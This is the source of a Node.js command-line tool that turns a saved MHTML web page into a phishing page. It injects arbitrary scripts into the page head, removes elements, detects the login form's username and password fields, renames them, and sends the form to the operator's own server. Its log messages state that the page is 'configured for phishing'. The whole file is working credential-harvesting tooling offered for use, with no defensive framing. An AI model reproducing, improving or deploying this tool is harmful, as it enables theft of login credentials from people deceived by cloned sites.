#!/bin/env node
const { Processor } = require("fast-mhtml")
const { Command } = require("commander")
const jsdom = require("jsdom")
const { JSDOM } = jsdom
const program = new Command()
const fs = require("fs")

program
    .name("lft - analyzer")
    .description("CLI to parse html code, and code manipulation")
    .version("1.1.0")

program.command("add")
    .description("add script in document")
    .argument("<file>", "file to modify")
    .option("-s, --script <script>", "script source")
    .action((file, options) => {
        if (options.script){
            fs.readFile(file, "utf-8", (err, data) => {
                if (err) {
                    console.error(`[info] failure to remove, reason: ${err}`)
                }

                console.log("[debug] starting analysis")
                const dom = new JSDOM(data)
                const document = dom.window.document
                const $ = require('jquery')(dom.window)
                
                $("head").append(options.script)

                console.log("[info] writing a html page with the changes")
                fs.writeFile(file, dom.serialize(), (err) => {
                    if (err) {
                        console.error(`[info] could not save, reason: ${err}`)
                    }
                    console.log("[info] changes saved, page ready and configured for phishing")
                })
            })
        } else {
            console.log("[err] the script is required")
            process.exit(1)
        }
    })
program.command("remove")
    .description("remove scripts, css, tags by selector")
    .argument("<file>", "file to modify")
    .option("-s, --selector <query>", "query-selector to remove from page")
    .option("-u, --unique", "search only one result")
    .action((file, options) => {
        if (options.selector) {
            fs.readFile(file, "utf-8", (err, data) => {
                if (err) {
                    console.error(`[info] failure to remove, reason: ${err}`)
                }
                console.log("[debug] starting analysis")
                const dom = new JSDOM(data)
                const document = dom.window.document

                console.log("[info] searching with selector")
                if (options.unique) {
                    const el = document.querySelector(`${options.selector}`)
                    el.remove()
                    console.log("[info] removed element")

                } else {
                    const el = document.querySelectorAll(`${options.selector}`)
                    el.forEach(e => {
                        e.remove()
                    })
                    console.log("[info] removed elements")
                }

                console.log("[info] writing a html page with the changes")
                fs.writeFile(file, dom.serialize(), (err) => {
                    if (err) {
                        console.error(`[info] could not save, reason: ${err}`)
                    }
                    console.log("[info] changes saved, page ready and configured for phishing")
                })

            })
        } else {
            console.log("[err] the selector is required")
            process.exit(1)
        }

    })

program.command("modify")
    .description("input and form modifier, to work with the server")
    .argument("<file>", "file to modify")
    .option("-ie, --input-email <emailName>", "html email input tag name", "email")
    .option("-ip, --input-password <passwordName>", "html password input tag name", "password")
    .option("-fa, --form-action <url>", "html form action", "/login")
    .action((file, options) => {
        fs.readFile(file, "utf-8", (err, data) => {
            if (err) {
                console.error(`[info] failure to modify, reason: ${err}`)
            }
            console.log("[debug] starting analysis")
            const dom = new JSDOM(data)
            const document = dom.window.document

            const form = document.querySelector('form[method="post"]')
            const ilist = [...document.querySelectorAll('input')]

            const loginInfo = {
                emailName: "",
                passwordName: "",
                formAction: form.getAttribute("action") || undefined
            }

            const patterns = {
                email: /email/g,
                username: /user/g,
            }

            console.log("[info] looking for the inputs responsible for login, email, username, password")
            ilist.forEach(e => {
                if (e.getAttribute("type") == "text") {
                    if (patterns.email.test(e.getAttribute("name")) || patterns.username.test(e.getAttribute("name"))) {
                        loginInfo.emailName = e.getAttribute("name")
                    }
                } else if (e.getAttribute("type") == "password") {
                    loginInfo.passwordName = e.getAttribute("name")
                }
            })

            console.log("[info] analyze has been completed")
            console.log("[info] starting process of changing detected inputs")

            const emailInput = document.querySelector(`input[name="${loginInfo.emailName}"]`)
            const passwInput = document.querySelector(`input[name="${loginInfo.passwordName}"]`)

            emailInput.setAttribute("name", options.inputEmail)
            passwInput.setAttribute("name", options.inputPassword)
            if (!loginInfo.formAction) {
                console.log("[warn] could not detect the form, you will have to change it manually.")
            } else {
                form.setAttribute("action", options.formAction)
            }

            console.log("[info] input change completed")
            console.log("[info] writing a html page with the changes")
            fs.writeFile(file, dom.serialize(), (err) => {
                if (err) {
                    console.error(`[info] could not save, reason: ${err}`)
                }
                console.log("[info] changes saved, page ready and configured for phishing")
            })
        })
    })

program.command("mount")
    .description("mhtml, page assembler")
    .argument("<mhtml>", "file to mount")
    .action((file, options) => {
        console.log("[info] building page")
        fs.mkdir("out", async (err) => {
            if (err) {
                console.error(`[info] failure to mount, reason: ${err}`)
            }
            if (!err) {
                await Processor.convert(file)
                console.log("[info] page mounted successfully, emit -> ./out")
            }
        })
    })

program.parse(process.argv)
